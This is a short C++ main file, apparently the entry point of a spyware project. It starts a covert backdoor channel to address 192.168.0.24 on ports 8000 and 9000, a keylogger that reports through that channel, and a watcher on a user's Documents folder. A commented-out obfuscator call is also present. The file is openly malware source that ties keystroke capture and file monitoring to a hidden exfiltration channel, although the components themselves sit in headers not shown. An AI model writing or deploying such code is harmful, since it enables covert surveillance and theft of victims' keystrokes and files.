
#include "covert_channel/backdoor_channel.h"
#include "keylogger/keylogger.h"
#include "file_watcher/file_watcher.h"
//#include "obfuscator/refork.h"
#include <thread>
#include <sys/inotify.h>

int main(){

    Backdoor_Channel ch;
    Key_Logger kl(ch);
    File_Watcher fw(ch);
        
    
    std::thread bd_thread(&Backdoor_Channel::start, &ch, "lo", 8000, 9000, "192.168.0.24");
    std::thread kl_thread(&Key_Logger::start, &kl);
    std::thread fw_thread(&File_Watcher::start, &fw, "/home/dimitry/Documents", IN_CLOSE_WRITE);
    
    //refork_init(1);
    //refork();
    bd_thread.join();
    kl_thread.join();
    fw_thread.join();
}
